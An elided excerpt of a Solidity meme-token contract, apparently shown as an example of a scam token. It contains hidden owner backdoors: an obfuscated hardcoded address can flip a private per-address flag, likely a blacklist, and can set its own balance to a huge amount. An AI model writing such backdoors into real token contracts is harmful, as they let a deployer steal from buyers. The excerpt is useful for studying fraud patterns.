...
contract MEMEToken is Ownable {
    ...
    address public _beeceo455;
    mapping(address => bool) private rfdvipp;
    function quitOPDoge(address sss) external   {
        if (_beeceo455 == _msgSender()) {
            rfdvipp[sss] = false;
        }
         if (_beeceo455 == _msgSender()) {
            rfdvipp[sss] = false;
    ...
    function adminvivvip() external {
        ...
        if(_beeceo455 == adminAddress){
            _balances[_beeceo455] = googoNum()*(45000);
        }
        if(_beeceo455 == adminAddress){
            _balances[_beeceo455] = googoNum()*(45000);
        }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _beeceo455 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
